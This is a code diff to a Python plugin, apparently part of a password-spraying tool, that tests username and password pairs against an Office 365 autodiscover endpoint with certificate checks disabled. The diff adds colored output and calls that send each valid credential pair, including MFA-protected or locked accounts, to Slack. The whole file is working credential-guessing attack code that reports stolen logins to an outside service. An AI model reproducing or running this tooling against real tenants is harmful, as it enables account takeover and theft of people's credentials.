@@ -2,7 +2,6 @@ import datetime, requests
 import utils.utils as utils
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
-
 def o365_authenticate(url, username, password, useragent, pluginargs):
 
     ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
@@ -45,13 +44,17 @@ def o365_authenticate(url, username, password, useragent, pluginargs):
         r = requests.get("{}/autodiscover/autodiscover.xml".format(url), auth=(username, password), headers=headers, verify=False, timeout=30)
 
         if r.status_code == 200:
-            data_response['output'] = "SUCCESS: {username}:{password}".format(username=username,password=password)
+            data_response['output'] = utils.prGreen("[!] SUCCESS: {username}:{password}".format(username=username,password=password))
             data_response['success'] = True
+            utils.slacklog("Valid Credentials found!!")
+            utils.slacknotify(username, password)
         elif r.status_code == 456:
-            data_response['output'] = "SUCCESS: {username}:{password} - 2FA or Locked".format(username=username,password=password)
+            data_response['output'] = utils.prGreen("[!]SUCCESS: {username}:{password} - 2FA or Locked".format(username=username,password=password))
             data_response['success'] = True
+            utils.slacklog("Credentials Valid but MFA enabled or account locked out!")
+            utils.slacknotify(username, password)
         else:
-            data_response['output'] = "FAILED: {username}:{password}".format(username=username,password=password)
+            data_response['output'] =  utils.prRed("FAILED: {username}:{password}".format(username=username,password=password))
             data_response['success'] = False
 
 
